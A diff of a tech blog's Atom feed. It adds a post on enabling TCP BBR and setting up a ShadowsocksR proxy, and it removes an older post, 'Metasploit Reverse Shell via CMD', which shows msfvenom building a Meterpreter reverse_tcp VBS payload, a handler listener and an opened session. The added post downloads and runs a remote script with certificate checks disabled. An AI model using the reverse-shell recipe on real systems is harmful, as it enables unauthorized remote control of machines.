@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.safebuff.com/"/>
-  <updated>2017-05-31T08:16:44.000Z</updated>
+  <updated>2017-06-22T03:12:14.000Z</updated>
   <id>http://blog.safebuff.com/</id>
   
   <author>
@@ -14,6 +14,40 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Google TCPBBR With Shadowsocksr</title>
+    <link href="http://blog.safebuff.com/2017/06/21/Google-TCPBBR-With-Shadowsocksr/"/>
+    <id>http://blog.safebuff.com/2017/06/21/Google-TCPBBR-With-Shadowsocksr/</id>
+    <published>2017-06-21T09:17:32.000Z</published>
+    <updated>2017-06-22T03:12:14.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="Google-TCPBBR"><a href="#Google-TCPBBR" class="headerlink" title="Google TCPBBR"></a>Google TCPBBR</h4><p>CentOS 6+，Debian 7+，Ubuntu 12+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.11/linux-headers-4.11.0-041100_4.11.0-041100.201705041534_all.deb</span><br><span class="line">&gt; dpkg -i linux-image-4.*.deb</span><br><span class="line">&gt; update-grub</span><br><span class="line">&gt; reboot</span><br><span class="line">&gt; modprobe tcp_bbr</span><br><span class="line">&gt; echo &quot;tcp_bbr&quot; &gt;&gt; /etc/modules-load.d/modules.conf</span><br><span class="line">&gt; echo &quot;net.core.default_qdisc=fq&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">&gt; echo &quot;net.ipv4.tcp_congestion_control=bbr&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">&gt; sysctl -p</span><br><span class="line">&gt; sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">&gt; sysctl net.ipv4.tcp_congestion_control</span><br></pre></td></tr></table></figure>
+<p>or quick install via bash script<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget -N --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;&amp; chmod +x bbr.sh &amp;&amp; bash bbr.sh</span><br><span class="line">&gt; uname -r  # if have 4.9.0 success install</span><br><span class="line">&gt; sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">&gt; sysctl net.ipv4.tcp_congestion_control</span><br><span class="line">&gt; sysctl net.core.default_qdisc</span><br><span class="line">&gt; lsmod | grep bbr    # have bbr success install</span><br></pre></td></tr></table></figure></p>
+<h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; apt-get install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr</span><br></pre></td></tr></table></figure>
+<p>Debian / Ubuntu:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; apt-get install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p>
+<p>CentOS:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; yum install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p>
+<p>Windows:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd shadowsocksr &amp;&amp; bash initcfg.sh</span><br><span class="line">&gt; cd ~/shadowsocksr/shadowsocks</span><br><span class="line">&gt; python server.py -p 443 -k password -m aes-128-cfb -O auth_chain_a -o tls1.2_ticket_auth -d start</span><br></pre></td></tr></table></figure>
+<h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><p>Android APP: <a href="https://github.com/shadowsocksr/shadowsocksr-android/releases" target="_blank" rel="external">SSR-android</a></p>
+<p>iOS APP： <a href="https://itunes.apple.com/us/app/shadowrocket/id932747118" target="_blank" rel="external">Shadowrocket</a>, <a href="https://itunes.apple.com/app/id1162704202?mt=8" target="_blank" rel="external">Potatso2</a></p>
+<p>MAC APP：<a href="https://github.com/shadowsocksr/ShadowsocksX-NG/releases" target="_blank" rel="external">ShadowsocksX-NG-R8</a></p>
+<p>其它跨平台分支：<a href="https://github.com/avege/avege" target="_blank" rel="external">avege</a>, <a href="https://github.com/erguotou520/electron-ssr" target="_blank" rel="external">electron-ssr</a></p>
+<h4 id="Speed-Setting"><a href="#Speed-Setting" class="headerlink" title="Speed Setting"></a>Speed Setting</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; vi /etc/security/limits.conf  # add line to file</span><br><span class="line">*   soft    nofile  512000</span><br><span class="line">*   hard    nofile  1024000</span><br><span class="line">&gt; vi /etc/profile   # add line to file</span><br><span class="line">ulimit -SHn 1024000</span><br><span class="line">&gt; reboot</span><br><span class="line">&gt; ulimit -n     # if return 1024000 success</span><br><span class="line">&gt; vi /etc/sysctl.conf</span><br><span class="line"># turn on TCP Fast Open on both client and server side</span><br><span class="line">net.ipv4.tcp_fastopen = 3</span><br><span class="line">&gt; vi /etc/shadowsocks.json  # edit false to true</span><br><span class="line">&quot;fast_open&quot;: true</span><br><span class="line">&gt; apt-get install python-m2crypto</span><br><span class="line">&gt; pip install M2Crypto --upgrade</span><br><span class="line">&gt; apt-get install python-dev libevent-dev python-setuptools python-gevent</span><br><span class="line">easy_install greenlet gevent</span><br></pre></td></tr></table></figure>
+<p>Docker: <a href="https://hub.docker.com/r/breakwa11/shadowsocksr/" target="_blank" rel="external">https://hub.docker.com/r/breakwa11/shadowsocksr/</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;Google-TCPBBR&quot;&gt;&lt;a href=&quot;#Google-TCPBBR&quot; class=&quot;headerlink&quot; title=&quot;Google TCPBBR&quot;&gt;&lt;/a&gt;Google TCPBBR&lt;/h4&gt;&lt;p&gt;CentOS 6+，Debian 7+，Ubuntu
+    
+    </summary>
+    
+    
+      <category term="Shadowsocksr" scheme="http://blog.safebuff.com/tags/Shadowsocksr/"/>
+    
+  </entry>
   
   <entry>
     <title>Ubuntu16.04.2 network not work</title>
@@ -798,30 +832,6 @@
     
     
       <category term="git-flow" scheme="http://blog.safebuff.com/tags/git-flow/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Metasploit Reverse Shell via CMD</title>
-    <link href="http://blog.safebuff.com/2016/11/01/Metasploit-Reverse-Shell-via-CMD/"/>
-    <id>http://blog.safebuff.com/2016/11/01/Metasploit-Reverse-Shell-via-CMD/</id>
-    <published>2016-11-01T14:06:22.000Z</published>
-    <updated>2016-11-01T14:19:50.000Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="0x01-Generate-vbs"><a href="#0x01-Generate-vbs" class="headerlink" title="0x01 Generate vbs"></a>0x01 Generate vbs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win &gt; test.vbs</span><br><span class="line"></span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of vbs file: 7384 bytes</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-Metasploit-listen"><a href="#0x02-Metasploit-listen" class="headerlink" title="0x02 Metasploit listen"></a>0x02 Metasploit listen</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.0.103</span><br><span class="line">msf exploit(handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.103:4444</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-Windows-run-vbs"><a href="#0x03-Windows-run-vbs" class="headerlink" title="0x03 Windows run vbs"></a>0x03 Windows run vbs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;cscript.exe ./test.vbs</span><br><span class="line"></span><br><span class="line">Microsoft (R) Windows Script Host Version 5.6</span><br><span class="line">版权所有(C) Microsoft Corporation 1996-2001。保留所有权利。</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-Metasploit-item2"><a href="#0x04-Metasploit-item2" class="headerlink" title="0x04 Metasploit item2"></a>0x04 Metasploit item2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.103:4444</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (983599 bytes) to 192.168.0.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.103:4444 -&gt; 192.168.0.103:49778) at 2016-11-01 22:16:44 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;0x01-Generate-vbs&quot;&gt;&lt;a href=&quot;#0x01-Generate-vbs&quot; class=&quot;headerlink&quot; title=&quot;0x01 Generate vbs&quot;&gt;&lt;/a&gt;0x01 Generate vbs&lt;/h3&gt;&lt;figure class
-    
-    </summary>
-    
-    
-      <category term="Metasploit" scheme="http://blog.safebuff.com/tags/Metasploit/"/>
     
   </entry>
   
